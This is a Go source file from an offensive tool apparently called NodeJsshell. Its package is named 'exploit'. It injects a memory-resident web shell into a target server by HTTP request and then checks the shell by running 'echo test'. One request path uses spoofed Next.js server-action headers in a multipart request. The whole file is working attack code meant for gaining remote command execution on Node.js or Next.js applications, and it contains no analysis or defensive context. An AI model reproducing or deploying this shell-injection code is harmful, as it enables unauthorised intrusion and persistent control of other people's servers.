package exploit

import (
	"fmt"
	"NodeJsshell/core/payload"
	"NodeJsshell/core/transport"
	"time"
)

func InjectMemoryShell(url string, password string, encodeType string, templateName string) error {
	payloadCode, err := payload.GeneratePayload(templateName, password, encodeType, 2)
	if err != nil {
		return fmt.Errorf("failed to generate payload: %v", err)
	}
	client := transport.NewHTTPClient()
	req := transport.BuildRequest(password, encodeType, "exec", payloadCode)
	resp, err := client.SendRequest(url, req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	if !resp.Success {
		return fmt.Errorf("injection failed: %s", resp.Error)
	}
	return nil
}

func VerifyConnection(url string, password string, encodeType string, protocol string) (bool, int, error) {
	start := time.Now()
	client := transport.NewHTTPClient()
	var resp *transport.Response
	var err error
	if protocol == "multipart" {
		customHeaders := map[string]string{
			"Next-Action":            "x",
			"X-Nextjs-Request-Id":    "test",
			"X-Nextjs-Html-Request-Id": "test",
		}
		resp, err = client.SendMultipartRequest(url, "echo test", password, "base64", customHeaders)
	} else {
		req := transport.BuildRequest(password, encodeType, "exec", "echo test")
		resp, err = client.SendRequest(url, req)
	}
	if err != nil {
		return false, 0, err
	}
	latency := int(time.Since(start).Milliseconds())
	return resp.Success, latency, nil
}



